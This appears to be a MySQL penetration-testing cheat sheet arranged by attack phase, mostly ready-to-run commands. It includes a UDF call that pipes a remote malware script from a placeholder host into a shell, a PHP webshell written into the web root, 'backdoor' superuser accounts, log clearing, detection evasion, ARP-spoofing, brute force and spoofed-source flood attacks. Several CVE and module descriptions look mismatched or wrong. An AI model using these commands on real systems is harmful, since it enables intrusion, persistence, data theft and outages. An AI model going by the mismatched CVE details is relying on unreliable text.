MySQL Workbench is a visual tool for database architects, developers, and DBAs. It provides a graphical interface to design, model, and manage MySQL databases.

Connect to MySQL Server

- Open MySQL Workbench.
- Click on `Database > Connect to Database`.
- Enter the connection details (hostname, port, username, password).
- Click `OK` to connect.

### Execute OS Commands
- MySQL does not have a built-in feature equivalent to `xp_cmdshell`. However, you can execute OS commands indirectly through user-defined functions (UDFs) or by using external scripting languages like Python or PHP that interact with the MySQL server.

	```sql
	CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';
	SELECT sys_exec('whoami');
	```

### Read Local Files
- By default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods.  For `LOAD_FILE()` to work, the MySQL server must have file privileges and the file path must be accessible by the MySQL user. The `secure_file_priv` variable can restrict the directories from which files can be read.

	```sql
	SELECT LOAD_FILE('/path/to/file.txt');
	```

### Write Local Files
- MySQL can write files using the `SELECT INTO OUTFILE` statement, which writes the result of a query into a file. The file created by `SELECT INTO OUTFILE` cannot already exist, and the MySQL user must have file privileges. The `secure_file_priv` variable can also restrict the directories where files can be written.

	```sql
	SELECT 'Some data' INTO OUTFILE '/path/to/file.txt';
	```

### Remote Code Execution
- Remote code execution can be achieved via UDFs or exploiting `SELECT ... INTO OUTFILE` to write malicious scripts to a web directory.

	```sql
	CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
	SELECT sys_exec('bash -c "curl http://example.com/malware.sh | sh"');
	```

- Remote command execution can also be performed by writing into a location in the file system that can execute commands. For example, suppose MySQL operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using SELECT INTO OUTFILE in the webserver directory. Then we can browse to the location where the file is and execute our commands.

- **In target database:**
	```sql
	SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE '/web/root/folder/webshell.php';
	```
- **In attack browser (single command):**
	```sql
	http://<target_ip>/sitename/webshell.php?cmd=<attack_cmd_here>
	```
- **In attack browser (mutliple commands):**
	```sql
	http://<target_ip>/sitename/webshell.php?cmd=<attack_cmd_here>%26<attack_cmd_here>
	```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 3306
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 3306
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

## Initial Access

### Exploiting Default Credentials
- **Tool:** [[SQLMap Cheat Sheet]]
    ```bash
    sqlmap -u "http://<target_ip>/vulnerable.php?id=1" --dbms=mysql --batch --passwords
    ```
- **Description:** Attempts to log in using default or weak credentials to gain access to the MySQL database.

### Exploiting SQL Injection
- **Tool:** [[SQLMap Cheat Sheet]]
	```bash
	sqlmap -u "http://<target_ip>/vulnerable_page.php?id=1" --dbms=mysql --dump
	```
- **Description:** Exploits SQL Injection vulnerabilities to extract data from MSSQL databases.

## Persistence

### Create a SQL User Account
- **Tool:** [[MySQL]]
    ```sql
    CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password';
    GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
    ```
- **Description:** Creates a new user with full privileges that can be used to maintain access to the database.

### Change Existing User Account Password
- **Tool:** [[MySQL]]
	```bash
	ALTER USER 'root'@'localhost' IDENTIFIED BY 'newpassword';
	```
- **Description:** Modify an existing user account password for persistent access.

### Scheduled Event Creation
- **Tool:** [[MySQL]]
    ```sql
    CREATE EVENT backdoor_event ON SCHEDULE EVERY 1 HOUR DO INSERT INTO logs (message) VALUES ('backdoor');
    ```
- **Description:** Schedules a recurring event that can be used to execute malicious SQL commands periodically.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port <port>"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[BetterCap Cheat Sheet]]
	```bash
	bettercap -iface <interface> -T <target_ip> --proxy
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

### Password Dumping via SQL Injection
- **Tool:** [[SQLMap Cheat Sheet]]
    ```bash
    sqlmap -u "http://<target_ip>/vulnerable.php?id=1" --dbms=mysql --dump --passwords
    ```
- **Description:** Dumps usernames and passwords from the MySQL database by exploiting SQL injection.

## Privilege Escalation

### Create Admin Account
- **Tool:** [[MySQL]]
    ```sql
    CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password';
    GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
    ```
- **Description:** Creates a new admin account with full privileges that can be used to maintain access to the database.

### Change Existing Admin Account Password
- **Tool:** [[MySQL]]
	```bash
	ALTER USER 'root'@'localhost' IDENTIFIED BY 'newpassword';
	```
- **Description:** Modify an existing user account password for persistent access.

### Manipulate Existing User Account
- **Tool:** [[MySQL]]]
	```bash
	SHOW GRANTS FOR '<username>'@'<host>';
	GRANT ALL PRIVILEGES ON <database_name>.* TO '<username>'@'localhost';
	```
- **Description:** Modify existing user entries to escalate privileges of a lower-privileged account.

### Privilege Escalation via SQL Injection
- **Tool:** [[SQLMap Cheat Sheet]]
    ```bash
    sqlmap -u "http://<target_ip>/vulnerable.php?id=1" --dbms=mysql --os-shell
    ```
- **Description:** Escalates privileges by leveraging SQL injection to execute system commands.

### Abusing Stored Procedures
- **Tool:** [[MySQL]]
	```sql
	DELIMITER $$
	CREATE PROCEDURE elevate_privs()
	BEGIN
	DECLARE CONTINUE HANDLER FOR SQLEXCEPTION RESIGNAL;
	GRANT ALL PRIVILEGES ON *.* TO 'root'@'%';
	END$$
	CALL elevate_privs()$$
	```
- **Description:** Exploits stored procedures to execute arbitrary SQL commands with elevated privileges.

### MySQL UDF (User-Defined Function) Injection
- **Tool:** [[MySQL]] 
	```sql
	CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'; SELECT sys_exec('id');
	```
- **Description:** Loading malicious shared libraries to execute commands on the host system. Allows execution of OS-level commands.

## Internal Reconnaissance

### Database Enumeration
- **Tool:** [[MySQL]]
    ```sql
    SHOW DATABASES;
    SELECT table_name FROM information_schema.tables;
    ```
- **Description:** Enumerates databases, tables, and columns to map out the database structure.

### User Enumeration
- **Tool:** [[MySQL]]
    ```sql
    SELECT user, host FROM mysql.user;
    ```
- **Description:** Lists all users and their respective hosts, identifying potential targets for privilege escalation.

## Lateral Movement, Pivoting, and Tunneling

### Pivoting via MySQL
- **Tool:** [[SSH]]
    ```bash
    ssh -L 3307:<target_ip>:3306 user@pivot_host
    mysql -h 127.0.0.1 -P 3307 -u root -p
    ```
- **Description:** Creates an SSH tunnel to pivot through a compromised host and access MySQL on a different network segment.

## Defense Evasion

### Obfuscating Queries
- **Tool:** [[MySQL]]
    ```sql
    SELECT /*!50000 * */ FROM /*!50000 users */;
    ```
- **Description:** Obfuscates SQL queries to bypass detection by security monitoring tools.

### Clearing Logs
- **Tool:** [[MySQL]] 
	```sql
	FLUSH LOGS;
	```
- **Description:** Clears MySQL logs to erase traces of malicious activities.

## Data Exfiltration

### Data Dump via SQL Injection
- **Tool:** [[SQLMap Cheat Sheet]]
    ```bash
    sqlmap -u "http://<target_ip>/vulnerable.php?id=1" --dbms=mysql --dump
    ```
- **Description:** Extracts large volumes of data from the MySQL database by exploiting SQL injection.

### Exfiltration via Custom Queries
- **Tool:** [[MySQL]]
    ```sql
    SELECT * FROM sensitive_data INTO OUTFILE '/tmp/data.txt';
    ```
- **Description:** Dumps sensitive data to a file on the server, which can then be exfiltrated.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra mysql://<target_ip> -s 3306 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra mysql://<target_ip> -s 3306 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

### Offline Hash Cracking
- **Tool:** [[John the Ripper Cheat Sheet]]
    ```bash
    john --wordlist=<path/to/wordlist> <hash_file>
    ```

<br>

- **Tool:** [[HashCat Cheat Sheet]]
	```bash
	hashcat -m <mode> <hash_file> <path/to/wordlist>
	```
- **Description:** Cracks dumped password hashes to gain access.

### Exploiting Default Credentials
- **Tool:** [[SQLMap Cheat Sheet]]
    ```bash
    sqlmap -u "http://<target_ip>/vulnerable.php?id=1" --dbms=mysql --batch --passwords
    ```
- **Description:** Attempts to log in using default or weak credentials to gain access to the MySQL database.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p 3306 --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p 3306 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### Resource Exhaustion Attack
- **Tool:** [[MySQL]]
    ```sql
    SELECT BENCHMARK(100000000, ENCODE('hello', 'world'));
    ```
- **Description:** Executes a computationally expensive query repeatedly to exhaust server resources, potentially causing a denial of service.

## Exploits 

### MySQL Unauthorized Remote Root Access
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/linux/mysql/mysql_login
    ```
- **Description:** Exploits a vulnerability in MySQL versions that allows unauthorized remote root access.

### SQL Injection in Web Applications
- **Tool:** [[SQLMap Cheat Sheet]]
    ```bash
    sqlmap -u "http://<target_ip>/vulnerable.php?id=1" --dbms=mysql --os-shell
    ```
- **Description:** Exploits SQL injection vulnerabilities in web applications to execute system commands on the underlying OS.

### CVE-2020-2574
- **Tool:** [[Metasploit]]
	```bash
	use exploit/windows/mysql/mysql_payload
	set RHOST <target_ip>
	set RPORT 3306
	run
	```
- **Description:** Exploits a known vulnerability in MySQL 8.0 to execute arbitrary code on the server.

### CVE-2016-6662
- **Tool:** [[MySQL]]
	```sql
	mysql -u <user> -p -e "SET GLOBAL general_log = 'on'; SET GLOBAL general_log_file = '/var/lib/mysql/mysql-log.txt';"
	```
- **Description:** Remote code execution via MySQL config file (`my.cnf`) injection. This vulnerability allows an authenticated user to write arbitrary text to MySQL configuration files, which can lead to command execution as the MySQL user.

# Resources

|**Website**|**URL**|
|-|-|
| MySQL Documentation  | https://dev.mysql.com/doc/                      |
| SQLmap Project       | https://sqlmap.org/                             |
| Nmap (NSE Scripts)   | https://nmap.org/nsedoc/scripts/mysql-info.html |
| Metasploit Framework | https://www.metasploit.com/                     |
| MySQL Security Guide | https://dev.mysql.com/doc/refman/8.0/en/security.html |
| Percona Toolkit      | https://www.percona.com/software/mysql-database/percona-toolkit |
| Hydra Manual         | https://tools.kali.org/password-attacks/hydra   |
| phpMyAdmin           | https://www.phpmyadmin.net/                     |
| MySQL Workbench      | https://www.mysql.com/products/workbench/       |
| OWASP SQL Injection  | https://owasp.org/www-community/attacks/SQL_Injection |